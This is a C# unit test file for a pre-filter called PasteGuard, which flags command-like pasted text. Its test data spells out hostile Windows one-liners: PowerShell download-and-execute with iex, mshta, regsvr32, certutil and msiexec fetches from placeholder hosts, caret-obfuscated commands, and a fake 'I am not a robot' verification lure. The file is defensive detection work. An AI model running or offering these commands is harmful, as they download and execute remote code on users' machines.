using PasteGuard;
using Xunit;

namespace PasteGuard.Tests;

public class PreFilterTests
{
    [Theory]
    [InlineData("powershell -w hidden -c \"iex (irm https://example.com/a)\"")]
    [InlineData("mshta https://example.com/x.hta")]
    [InlineData("cmd /c curl -o a.exe http://203.0.113.1/a.exe && a.exe")]
    [InlineData("irm get.scoop.sh | iex")]
    [InlineData("regsvr32 /s /n /u /i:http://198.51.100.4/file.sct scrobj.dll")]
    [InlineData("certutil -urlcache -split -f http://x/a.exe a.exe")]
    [InlineData("conhost --headless cmd /c whoami")]
    [InlineData("finger verify@203.0.113.55")]
    [InlineData("p^o^w^e^r^s^h^e^l^l -c whoami")]
    [InlineData("& ('i'+'ex') 'x'")]
    [InlineData("msiexec /q /i https://example.com/a.msi")]
    [InlineData("rundll32.exe \\\\host@80\\share\\a.dll,Entry")]
    [InlineData("SyncAppvPublishingServer.vbs \"n; whoami\"")]
    public void Flags_command_like_text(string text) =>
        Assert.True(PreFilter.Check(text).IsCommandLike, text);

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    [InlineData("Meeting moved to 3pm tomorrow.")]
    [InlineData("git commit -m \"fix\" && git push")]
    [InlineData("npm install --save-dev typescript")]
    [InlineData("https://github.com/microsoft/winget-cli/releases")]
    [InlineData("sfc /scannow")]
    [InlineData("curl is a command line tool")]
    [InlineData("The comedy show was hilarious")]
    [InlineData("SELECT * FROM users WHERE id = 1")]
    [InlineData("C:\\Program Files\\App\\app.exe")]
    public void Ignores_ordinary_text(string? text) =>
        Assert.False(PreFilter.Check(text).IsCommandLike, text ?? "<null>");

    [Fact]
    public void Reports_fake_verification_signal()
    {
        var result = PreFilter.Check("mshta https://x.example/a # I am not a robot - Verification ID 123");
        Assert.Contains("mshta", result.Indicators);
        Assert.Contains("fake-verification", result.Indicators);
    }

    [Fact]
    public void Corpus_malicious_samples_all_pass_the_prefilter()
    {
        var path = FindCorpus();
        var misses = File.ReadLines(path)
            .Where(l => l.Contains("\"label\":\"malicious\""))
            .Select(l => System.Text.Json.JsonDocument.Parse(l).RootElement.GetProperty("text").GetString()!)
            .Where(t => !PreFilter.Check(t).IsCommandLike)
            .ToList();
        Assert.Empty(misses);
    }

    internal static string FindCorpus()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null && !File.Exists(Path.Combine(dir.FullName, "corpus", "samples.jsonl"))) dir = dir.Parent;
        return Path.Combine(dir?.FullName ?? throw new FileNotFoundException("corpus/samples.jsonl"), "corpus", "samples.jsonl");
    }
}
